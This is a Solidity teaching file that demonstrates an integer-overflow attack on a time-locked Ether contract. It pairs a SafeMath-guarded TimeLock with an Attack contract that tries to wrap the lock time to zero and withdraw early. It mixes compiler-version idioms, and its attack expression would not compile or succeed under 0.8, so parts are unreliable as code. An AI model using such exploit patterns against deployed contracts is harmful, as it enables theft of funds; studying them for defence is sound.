// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

/*
Overflow / Underflow
Code & Demo
Priventative techiniques`
*/

contract TimeLock {
    using SafeMath for uint;

    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        // 0.6 语法 deprecated
        // lockTime[msg.sender] += now + 1 weeks;
        lockTime[msg.sender] += block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        // old
        // lockTime[msg.sender] += _secondsToIncrease;
        // after using SafeMath library, change to this syantax
        lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease);
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        // require(now > lockTime[msg.sender], "Lock time not expired");
        require(
            block.timestamp > lockTime[msg.sender],
            "Lock time not expired"
        );

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) public {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() external payable {
        timeLock.deposit{value: msg.value}();
        // t == current lock time
        // find x such that
        // x + t = 2**256 = 0
        // x= -t
        timeLock.increaseLockTime(
            // 2**256 - 1
            // 0.6 语法
            // uint(-timeLock.lockTime(address(this)))
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}
